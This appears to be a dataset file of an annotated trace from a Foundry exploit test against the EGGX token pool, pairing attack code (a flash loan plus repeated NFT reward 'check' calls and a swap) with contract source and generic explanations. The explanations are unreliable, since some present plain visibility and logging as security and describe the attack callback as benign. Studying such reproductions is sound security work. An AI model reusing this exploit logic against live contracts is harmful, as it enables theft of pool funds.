@@ -1,0 +1,758 @@
+[
+    {
+        "id": "147935914",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        bytes memory pollbalance = abi.encode(EGGX.balanceOf(address(pool)));\n        WETH.approve(address(pool), type(uint256).max);\n        EGGX.approve(address(pool), type(uint256).max);\n        emit log_named_uint(\"Attacker ETH balance before exploit\", WETH.balanceOf(address(this)));\n        bool zeroForOne = false;\n        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;\n        bytes memory data = abi.encodePacked(uint8(0x61));\n        pool.flash(address(this), 0, EGGX.balanceOf(address(pool)), pollbalance);\n        int256 amountSpecified = int256(EGGX.balanceOf(address(this)));\n        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);\n        emit log_named_uint(\"Attacker ETH balance after attack:\", WETH.balanceOf(address(this)));\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function appears to simulate an attack or exploit scenario. It performs several actions:  \n   - Sends all the Ether (ETH) balance of the contract to the zero address (a burn address).  \n   - Encodes the balance of a specific token (`EGGX`) held by a pool contract.  \n   - Approves the pool contract to spend unlimited amounts of `WETH` and `EGGX` tokens on behalf of the attacker.  \n   - Executes a flash loan from the pool contract, borrowing `EGGX` tokens.  \n   - Performs a swap operation using the borrowed tokens, potentially manipulating the pool's state.  \n   - Logs the attacker's ETH balance before and after the exploit to track the impact of the attack.  \n\n2. **Security mechanism**:  \n   - **`payable`**: Ensures the function can handle Ether transfers.  \n   - **`approve`**: Grants permission to the pool contract to spend tokens on behalf of the attacker.  \n   - **`emit`**: Logs critical information (e.g., ETH balances) for transparency and debugging.  \n   - **`flash` and `swap`**: These are likely part of a decentralized finance (DeFi) protocol, and their security depends on the underlying implementation of the pool contract.  \n\n3. **Parameter Function**:  \n   - **`zeroForOne`**: A boolean flag that likely determines the direction of the swap (e.g., swapping token A for token B or vice versa).  \n   - **`sqrtPriceLimitX96`**: A numerical limit for the swap price, ensuring the swap doesn\u2019t execute at unfavorable rates.  \n   - **`data`**: Encoded data passed to the swap function, possibly containing additional instructions or parameters.  \n   - **`amountSpecified`**: The amount of tokens to swap, derived from the attacker's `EGGX` balance.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it logs the attacker's ETH balance before and after the exploit. The difference between these logged values indicates the success or impact of the attack.  \n\n**In summary**, the `testExploit` function simulates an attack by manipulating a DeFi pool through a flash loan and swap operation. It logs the attacker's ETH balance to measure the exploit's effectiveness. The function relies on approvals and encoded data to interact with the pool contract, and its security depends on the underlying protocol's implementation.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": "",
+        "description": "",
+        "return_value": "12092425480766027049373298 [1.209e25]"
+    },
+    {
+        "id": "24420",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(\n        address spender,\n        uint256 amountOrId\n    ) public virtual returns (bool) {\n        if (amountOrId <= minted && amountOrId > 0) {\n            address owner = _ownerOf[amountOrId];\n\n            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {\n                revert Unauthorized();\n            }\n\n            getApproved[amountOrId] = spender;\n\n            emit Approval(owner, spender, amountOrId);\n        } else {\n            allowance[msg.sender][spender] = amountOrId;\n\n            emit Approval(msg.sender, spender, amountOrId);\n        }\n\n        return true;\n    }\n\n    /// @notice Function native approvals\n    function setApprovalForAll(address operator, bool approved) public virtual {\n        isApprovedForAll[msg.sender][operator] = approved;\n\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /// @notice Function for mixed transfers\n",
+        "description": "1. Core functions:  \n   - The `approve` function allows a user to grant permission to another address (`spender`) to manage a specific amount or token ID (`amountOrId`) on their behalf. It handles two scenarios: one for token IDs (like NFTs) and another for amounts (like fungible tokens).  \n   - The `setApprovalForAll` function lets a user give or revoke blanket permission to an `operator` to manage all their tokens.  \n\n2. Security mechanism:  \n   - The `approve` function checks if the caller is either the owner of the token or has been granted general approval by the owner. If not, it reverts with an `Unauthorized` error.  \n   - Both functions use the `public` and `virtual` modifiers, allowing them to be called by anyone and overridden in derived contracts.  \n   - Events (`Approval` and `ApprovalForAll`) are emitted to log actions, ensuring transparency and traceability.  \n\n3. Parameter Function:  \n   - In `approve`, `spender` is the address being granted permission, and `amountOrId` is the specific token ID or amount being approved.  \n   - In `setApprovalForAll`, `operator` is the address being granted or revoked permission, and `approved` is a boolean indicating whether to grant (`true`) or revoke (`false`) the permission.  \n\n4. Return description:  \n   - The `approve` function always returns `true` if the operation is successful, indicating that the approval was granted.  \n\nIn summary, these functions manage permissions for token transfers. The `approve` function handles specific approvals for tokens or amounts, while `setApprovalForAll` grants or revokes broad permissions. Both include checks to ensure only authorized users can perform these actions and emit events for transparency.",
+        "return_value": "true"
+    },
+    {
+        "id": "26703",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12092425480766027049373298 [1.209e25]"
+    },
+    {
+        "id": "147635086",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 12092425480766027049373298 [1.209e25], 0x0000000000000000000000000000000000000000000a00abb2e764a7f8de8e72",
+        "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override lock noDelegateCall {\n        uint128 _liquidity = liquidity;\n        require(_liquidity > 0, 'L');\n\n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);\n        uint256 balance0Before = balance0();\n        uint256 balance1Before = balance1();\n\n        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);\n        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);\n\n        IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);\n\n        uint256 balance0After = balance0();\n        uint256 balance1After = balance1();\n\n        require(balance0Before.add(fee0) <= balance0After, 'F0');\n        require(balance1Before.add(fee1) <= balance1After, 'F1');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        if (paid0 > 0) {\n            uint8 feeProtocol0 = slot0.feeProtocol % 16;\n            uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;\n            if (uint128(fees0) > 0) protocolFees.token0 += uint128(fees0);\n            feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);\n        }\n        if (paid1 > 0) {\n            uint8 feeProtocol1 = slot0.feeProtocol >> 4;\n            uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;\n            if (uint128(fees1) > 0) protocolFees.token1 += uint128(fees1);\n            feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);\n        }\n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }\n\n    /// @inheritdoc IUniswapV3PoolOwnerActions\n",
+        "description": "1. Core functions:  \nThe `flash` function allows a user to borrow a certain amount of two tokens (`amount0` and `amount1`) from a liquidity pool and return them within the same transaction. This is commonly used in \"flash loans,\" where the borrowed tokens are used for immediate operations, and the user must repay the borrowed amount plus a fee. The function ensures that the pool's liquidity is maintained and that the fees are correctly calculated and distributed.\n\n2. Security mechanism:  \n- `lock`: This modifier prevents reentrancy attacks, ensuring that the function cannot be called again before the current execution is complete.  \n- `noDelegateCall`: This modifier ensures that the function cannot be called via a delegate call, which could lead to unexpected behavior or security vulnerabilities.  \n- The function also includes checks to ensure that the borrowed amounts are repaid with the correct fees (`require` statements for `balance0Before` and `balance1Before`).  \n\n3. Parameter Function:  \n- `recipient`: The address that will receive the borrowed tokens.  \n- `amount0`: The amount of the first token to be borrowed.  \n- `amount1`: The amount of the second token to be borrowed.  \n- `data`: Additional data that can be passed to the callback function, allowing for custom logic during the flash loan operation.  \n\n4. Return description:  \nThe function does not return a value directly but emits an event (`Flash`) that includes details about the transaction, such as the sender, recipient, borrowed amounts, and the fees paid. The function calculates the fees based on the borrowed amounts and ensures that the pool's liquidity and fee tracking are updated correctly.  \n\nIn summary, the `flash` function enables users to borrow tokens temporarily, ensures the pool's security and liquidity, and calculates and distributes fees appropriately.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94558499930692410326 [9.455e19]"
+    },
+    {
+        "id": "565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12092425480766027049373298 [1.209e25]"
+    },
+    {
+        "id": "84068426",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12092425480766027049373298 [1.209e25]",
+        "original_code": "    function transfer(\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        return _transfer(msg.sender, to, amount);\n    }\n\n    /// @notice Function for native transfers with contract support\n",
+        "description": "1. Core functions:  \nThe `transfer` function is designed to move a specified amount of tokens from the sender's address to another address (`to`). It acts as a bridge to call another internal function (`_transfer`) that handles the actual transfer logic. This function is virtual, meaning it can be overridden by other contracts that inherit it, allowing for customization of the transfer behavior.\n\n2. Security mechanism:  \nThe function uses the `public` modifier, making it accessible to anyone. However, it relies on the `msg.sender` parameter to ensure that only the caller can initiate the transfer from their own address. This prevents unauthorized users from transferring tokens from someone else's account. Additionally, since it calls an internal `_transfer` function, the actual transfer logic can include further security checks or validations.\n\n3. Parameter Function:  \n- `to`: This is the address of the recipient who will receive the tokens.  \n- `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.  \n\n4. Return description:  \nThe function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. This return value is determined by the internal `_transfer` function, which handles the actual transfer logic and checks for conditions like sufficient balance or valid addresses.\n\nIn summary, the `transfer` function facilitates the movement of tokens between addresses, ensures the sender is authorized, and provides feedback on the success of the operation.",
+        "return_value": "true"
+    },
+    {
+        "id": "63540233",
+        "args": "0, 36277276442298081148120 [3.627e22], 0x0000000000000000000000000000000000000000000a00abb2e764a7f8de8e72",
+        "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 pollbalance = abi.decode(data, (uint256));\n        uint256[] memory nftid = new uint256[](6);\n\n        nftid[0] = 30_342;\n        nftid[1] = 30_319;\n        nftid[2] = 30_031;\n        nftid[3] = 30_036;\n        nftid[4] = 30_028;\n        nftid[5] = 30_019;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_379;\n        nftid[1] = 30_363;\n        nftid[2] = 30_169;\n        nftid[3] = 30_267;\n        nftid[4] = 30_098;\n        nftid[5] = 30_484;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_281;\n        nftid[1] = 30_217;\n        nftid[2] = 30_245;\n        nftid[3] = 30_192;\n        nftid[4] = 30_027;\n        nftid[5] = 30_181;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_368;\n        nftid[1] = 30_488;\n        nftid[2] = 30_259;\n        nftid[3] = 30_284;\n        nftid[4] = 30_084;\n        nftid[5] = 30_395;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_408;\n        nftid[1] = 30_111;\n        nftid[2] = 30_365;\n        nftid[3] = 30_144;\n        nftid[4] = 30_176;\n        nftid[5] = 30_054;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_039;\n        nftid[1] = 30_045;\n        nftid[2] = 30_030;\n        nftid[3] = 30_070;\n        nftid[4] = 30_055;\n        nftid[5] = 30_213;\n        EGGXCliam.check(nftid);\n\n        emit log_named_uint(\"Attacker EGGX exploit balance:\", EGGX.balanceOf(address(this)));\n        EGGX.transfer(address(pool), pollbalance + fee1);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The main purpose of this function is to handle a callback after a flash loan operation on Uniswap V3. It processes a set of predefined NFT IDs by passing them to a function called `EGGXCliam.check`. After performing these checks, it calculates and transfers a specific amount of tokens (including fees) back to the pool. Additionally, it emits an event to log the balance of a specific token (`EGGX`) in the contract.\n\n2. **Security mechanism**:  \n   - The function uses `external` visibility, meaning it can only be called from outside the contract, ensuring it is not misused internally.  \n   - The `data` parameter is decoded to extract a value (`pollbalance`), which is later used in the transfer operation, ensuring the correct amount is sent back to the pool.  \n   - The function includes an event (`emit log_named_uint`) to log the balance of `EGGX` tokens, which can help in monitoring and auditing the contract's state.  \n\n3. **Parameter Function**:  \n   - `fee0` and `fee1`: These represent the fees associated with the flash loan for two different tokens. They are used in the final transfer to ensure the correct amount is sent back to the pool.  \n   - `data`: This is a packed data structure that contains information about the loan. It is decoded to extract `pollbalance`, which is used to calculate the amount to be transferred back.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs actions such as checking NFT IDs, logging the balance of `EGGX` tokens, and transferring tokens back to the pool. The transfer amount is calculated as the sum of `pollbalance` (decoded from `data`) and `fee1`.  \n\n**In summary**, this function is a callback for a flash loan operation. It processes predefined NFT IDs, logs the balance of a specific token, and transfers tokens (including fees) back to the pool. It includes security measures like external visibility and event logging to ensure proper execution and transparency.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "8803398",
+        "args": "[30342 [3.034e4], 30319 [3.031e4], 30031 [3.003e4], 30036 [3.003e4], 30028 [3.002e4], 30019 [3.001e4]]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30342 [3.034e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30319 [3.031e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30031 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30036 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30028 [3.002e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30019 [3.001e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "17981",
+        "args": "30342 [3.034e4]",
+        "original_code": "    function tokenURI(uint256 id) public view override returns (string memory) {\n        if (bytes(baseTokenURI).length > 0) {\n            return string.concat(baseTokenURI, Strings.toString(id));\n        } else {\n            string memory image;\n            string memory color;\n            string memory pattern;\n            string memory wings;\n\n            (image, color, pattern, wings) = _getImage(id);\n\n            string memory jsonPreImage = string.concat(\n                string.concat(\n                    string.concat('{\"name\": \"EGGX #', Strings.toString(id)),\n                    '\",\"description\":\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\",\"external_url\":\"https://eggs.build\",\"image\":\"'\n                ),\n                string.concat(dataURI, image)\n            );\n            string memory jsonPostImage = string.concat(\n                '\",\"attributes\":[{\"trait_type\":\"Color\",\"value\":\"',\n                color\n            );\n            string memory jsonPostImage1 = string.concat(\n                '\"},{\"trait_type\":\"Pattern\",\"value\":\"',\n                pattern\n            );\n            \n            string memory j1 = string.concat(jsonPostImage, jsonPostImage1);\n\n            string memory jsonPostImage2 = string.concat(\n                '\"},{\"trait_type\":\"Wings\",\"value\":\"',\n                wings\n            );\n\n            string memory j2 = string.concat(j1, jsonPostImage2);\n\n            string memory jsonPostTraits = '\"}]}';\n\n            return\n                string.concat(\n                    \"data:application/json;utf8,\",\n                    string.concat(\n                        string.concat(jsonPreImage, j2),\n                        jsonPostTraits\n                    )\n                );\n        }\n    }\n}\n}\n",
+        "description": "1. **Core functions:**  \n   The main purpose of this function is to generate and return a Uniform Resource Identifier (URI) for a specific token based on its unique ID. This URI is used to provide metadata about the token, such as its name, description, image, and attributes like color, pattern, and wings. If a base URI is provided, it simply combines the base URI with the token ID. Otherwise, it constructs a detailed JSON object containing all the relevant information about the token.\n\n2. **Security mechanism:**  \n   The function uses the `public view` modifier, which means it can be called by anyone but does not modify the state of the contract, ensuring it is safe to execute without risking unintended changes. The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency with the expected behavior. Additionally, the function handles cases where the `baseTokenURI` is empty, providing a fallback mechanism to generate metadata dynamically.\n\n3. **Parameter Function:**  \n   The function takes one parameter, `id`, which is a unique identifier for the token. This ID is used to fetch specific details about the token, such as its image, color, pattern, and wings, and to construct the final URI or JSON metadata.\n\n4. **Return description:**  \n   The function returns a string that represents the token's URI. If a `baseTokenURI` is provided, it concatenates this base URI with the token ID. If not, it constructs a JSON object containing the token's metadata, including its name, description, image, and attributes. This JSON object is then prefixed with \"data:application/json;utf8,\" to indicate its format and encoding.\n\n**In summary,**  \nThis function generates a URI for a token based on its ID, providing metadata in a structured format. It ensures flexibility by handling cases where a base URI is provided or dynamically constructing metadata if not. The function is secure, read-only, and designed to work seamlessly within the broader contract framework.",
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30342\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13894",
+        "args": "30319 [3.031e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30319\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14116",
+        "args": "30031 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30031\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudcamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13923",
+        "args": "30036 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30036\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudgreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13862",
+        "args": "30028 [3.002e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30028\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13956",
+        "args": "30019 [3.001e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30019\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudyellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "358910",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8686294",
+        "args": "[30379 [3.037e4], 30363 [3.036e4], 30169 [3.016e4], 30267 [3.026e4], 30098 [3.009e4], 30484 [3.048e4]]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30379 [3.037e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30363 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30169 [3.016e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30267 [3.026e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30098 [3.009e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30484 [3.048e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "13981",
+        "args": "30379 [3.037e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30379\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13894",
+        "args": "30363 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30363\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14116",
+        "args": "30169 [3.016e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30169\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudcamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13923",
+        "args": "30267 [3.026e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30267\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudgreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13862",
+        "args": "30098 [3.009e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30098\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13956",
+        "args": "30484 [3.048e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30484\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-cloudyellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"cloud\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "282606",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "10095953",
